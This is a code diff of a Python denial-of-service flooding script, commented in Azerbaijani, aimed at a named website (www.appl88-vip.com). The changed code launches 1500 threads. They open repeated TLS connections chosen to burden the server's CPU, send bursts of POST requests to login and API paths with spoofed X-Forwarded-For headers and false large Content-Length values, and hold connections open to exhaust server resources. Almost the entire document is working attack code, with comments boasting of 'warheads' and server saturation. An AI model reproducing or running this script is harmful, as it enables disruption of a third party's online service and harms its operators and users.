@@ -5,70 +5,72 @@ import random
 import time
 import os
 
-# --- MAXIMUM OVERDRIVE CONFIG ---
+# --- TARGET EXTREME ---
 TARGET_HOST = "www.appl88-vip.com"
 TARGET_PORT = 443
-THREADS = 2000 # Railway Paid plan üçün maksimal şəbəkə sıxlığı
+THREADS = 1500 # Railway Paid üçün bu rəqəm daha asan keçir sistem limitlərini
 
 def r_str(n):
     return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
 
-def hyper_nova():
-    # SSL Handshake-i ən baha başa gələn üsulla qururuq (Server CPU-su üçün ölümcüldür)
+def neutron_strike():
+    # SSL context-i serveri deşifrə ilə yormaq üçün zəif və mürəkkəb ciphers ilə qururuq
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    ctx.set_ciphers('ALL:@SECLEVEL=1') # Serveri köhnə şifrləmələri həll etməyə məcbur edir
+    # Serveri hər yeni bağlantıda ağır RSA və AES128-GCM hesablamalarına məcbur edir
+    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
 
     while True:
         try:
-            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
+            # TCP bağlantısı
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paket yığılıb qalmasın, anında vursun
             s.settimeout(5)
 
+            # SSL handshaking - serverin CPU-sunu ən çox yoran hissə
             conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # Serverin API qatını (Backend) yoran mürəkkəb müraciət
-            # Hər paket serverin məlumat bazasında axtarış aparmasını təmin edir
-            for _ in range(300):
-                path = f"/api/user/login?v={random.random()}&id={r_str(32)}&invite_code={random.randint(111111, 999999)}"
+            # HTTP/2 Rapid Reset & Header Fragmentation təqlidi
+            # Saniyədə yüzlərlə yarımçıq və mürəkkəb müraciət
+            for i in range(250):
+                # Hər bir path bazadan fərqli məlumat çəkməyə hesablanıb
+                paths = ["/api/v2/items", "/#/register", "/api/user/login", "/api/v3/feed"]
+                path = random.choice(paths) + f"?v={random.random()}&id={r_str(30)}"
                 
                 payload = (
                     f"POST {path} HTTP/1.1\r\n"
                     f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,17)}_0 like Mac OS X) AppleWebKit/605.1.15\r\n"
-                    f"Accept: application/json, text/plain, */*\r\n"
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}\r\n"
+                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0\r\n"
+                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                     f"X-Requested-With: XMLHttpRequest\r\n"
-                    f"Content-Type: application/json\r\n"
-                    f"Content-Length: {random.randint(5000, 15000)}\r\n" # Serveri böyük data gözləməyə məcbur et
+                    f"Content-Type: application/x-www-form-urlencoded\r\n"
+                    f"Content-Length: {random.randint(50000, 100000)}\r\n" # Serverə çox böyük data yalanı
                     f"Connection: Keep-Alive\r\n"
                     f"\r\n"
-                    f"{'{\"key\":\"' + r_str(100) + '\"}'}"
                 ).encode()
-
+                
                 conn.sendall(payload)
-                # İkinci zərbə: Serveri asılı saxlamaq üçün yarımçıq paketlər (Slow-Read)
-                conn.send(os.urandom(1))
-            
-            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
+                # İkinci zərbə (Hanging Payload): Serveri buferini təmizləməyə imkan vermə
+                conn.send(os.urandom(1)) 
+
+            # Bağlantını bir az saxla ki, serverin port limiti dolsun
             time.sleep(2)
             conn.close()
-        except:
+        except Exception:
             pass
 
 def main():
-    print(f"💀 HYPER-NOVA PROTOCOL INITIALIZED: {TARGET_HOST}")
-    print("[!] Saturation Level: 2000 Parallel Warheads.")
+    print(f"☢️  NEUTRON PROTOCOL ARMED: {TARGET_HOST}")
+    print("[!] Saturation target: Origin Server SSL Management & DB I/O.")
     
     for i in range(THREADS):
-        t = threading.Thread(target=hyper_nova)
+        t = threading.Thread(target=neutron_strike)
         t.daemon = True
         t.start()
         if i % 100 == 0:
-            print(f"[*] {i} Heavy Units Deployed...")
+            print(f"[*] {i} Neutron-Warheads launched...")
             time.sleep(0.1)
 
     while True:
